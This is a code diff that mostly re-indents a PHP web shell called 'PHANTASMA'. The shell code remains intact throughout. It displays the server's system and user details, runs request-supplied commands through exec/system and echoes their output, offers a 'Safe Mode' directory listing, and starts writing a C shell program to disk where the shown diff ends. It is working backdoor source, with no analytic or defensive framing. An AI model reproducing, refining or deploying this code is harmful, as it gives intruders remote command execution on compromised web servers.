@@ -1,8 +1,7 @@
 <CENTER>
-<DIV STYLE="font-family: verdana; font-size: 25px; font-weight: bold; color: #F3b700;">PHANTASMA- NeW CmD ;) </DIV>
-<BR>
-<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3b700;">Informação do sistema</DIV>
-<?php
+    <DIV STYLE="font-family: verdana; font-size: 25px; font-weight: bold; color: #F3b700;">PHANTASMA- NeW CmD ;) </DIV>
+    <BR>
+    <?php
 
 // 
   closelog( );
@@ -15,50 +14,67 @@
   if ($chdir == "") $chdir = getcwd( );
 
 ?>
-<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
-<?php
+    <TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
+        <?php
 
   $uname = posix_uname( );
   while (list($info, $value) = each ($uname)) {
 
 ?>
-  <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;"><?= $info ?>: <?= $value ?></DIV></TD>
-  </TR>
-<?php
+        <TR>
+            <TD>
+                <DIV STYLE="font-family: verdana; font-size: 15px;"><?= $info ?>: <?= $value ?></DIV>
+            </TD>
+        </TR>
+        <?php
   }
 ?>
- 
-  <TR>
-   <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Script Current User: <?= $dono ?></DIV></TD>
-  </TR>
-  <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">PHP Version: <?= $ver ?></DIV></TD>
-  </TR>
-  <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">User Info: uid(<?= $login ?>) euid(<?= $euid ?>) gid(<?= $gid ?>)</DIV></TD>
-  </TR>
-  <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Current Path: <?= $chdir ?></DIV></TD>
-  </TR>
-  <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Server IP: <?php $aaa =  gethostbyname($SERVER_NAME);  echo $aaa;?></DIV></TD>
-  </TR>
-   <TR>
-    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Web Server: <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV></TD>
-  </TR>
-</TABLE>
-<BR>
-<?php
+
+        <TR>
+        <TR>
+            <TD>
+                <DIV STYLE="font-family: verdana; font-size: 15px;">Script Current User: <?= $dono ?></DIV>
+            </TD>
+        </TR>
+        <TR>
+            <TD>
+                <DIV STYLE="font-family: verdana; font-size: 15px;">PHP Version: <?= $ver ?></DIV>
+            </TD>
+        </TR>
+        <TR>
+            <TD>
+                <DIV STYLE="font-family: verdana; font-size: 15px;">User Info: uid(<?= $login ?>) euid(<?= $euid ?>)
+                    gid(<?= $gid ?>)</DIV>
+            </TD>
+        </TR>
+        <TR>
+            <TD>
+                <DIV STYLE="font-family: verdana; font-size: 15px;">Current Path: <?= $chdir ?></DIV>
+            </TD>
+        </TR>
+        <TR>
+            <TD>
+                <DIV STYLE="font-family: verdana; font-size: 15px;">Server IP:
+                    <?php $aaa =  gethostbyname($SERVER_NAME);  echo $aaa;?></DIV>
+            </TD>
+        </TR>
+        <TR>
+            <TD>
+                <DIV STYLE="font-family: verdana; font-size: 15px;">Web Server:
+                    <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV>
+            </TD>
+        </TR>
+    </TABLE>
+    <BR>
+    <?php
 
   if ($cmd != "") {
     echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Command Mode Run</DIV>";
 
 ?>
 
-<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Command Stdout</DIV>
-<?php
+    <DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Command Stdout</DIV>
+    <?php
 
 if ($fe == 1){
 $fe = "exec";
@@ -78,14 +94,14 @@ $fe = "system";
     ob_end_clean( );
 
 ?>
-<TEXTAREA COLS="75" ROWS="8" STYLE="font-family: verdana; font-size: 12px;">
+    <TEXTAREA COLS="75" ROWS="8" STYLE="font-family: verdana; font-size: 12px;">
 <?php
 
     if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
 ?>
 </TEXTAREA>
-<BR>
-<?php
+    <BR>
+    <?php
 
   }
  
@@ -93,8 +109,9 @@ $fe = "system";
     echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Safemode Mode Run</DIV>";
 
 ?>
-<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Safe Mode Directory Listing</DIV>
-<?php
+    <DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Safe Mode Directory Listing
+    </DIV>
+    <?php
 
     if ($dir = @opendir($chdir)) {
       echo "<TABLE border=1 cellspacing=1 cellpadding=0>";
@@ -157,7 +174,7 @@ $fe = "system";
   }
 
 ?>
-<?php
+    <?php
 
   if ($shell == "write") {
     $shell = "#include <stdio.h>\n" .
